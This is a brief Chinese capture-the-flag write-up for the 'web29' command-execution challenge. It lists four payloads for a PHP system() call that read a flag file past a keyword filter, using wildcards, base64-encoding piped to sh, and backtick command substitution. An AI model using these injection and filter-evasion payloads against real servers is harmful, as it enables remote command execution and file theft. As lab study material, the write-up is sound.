# web29(命令执行)
![](vx_images/196537730739163.png)
绕过方式多种
```
?c=system("tac fl??.php");
?c=system("tac *.php");//打开全部.php后缀的文件
?c=system('echo dGFjIGZsYWcucGhw | base64 -d | sh');//base64编码绕过
?c=system('cat `ls`');//内联
```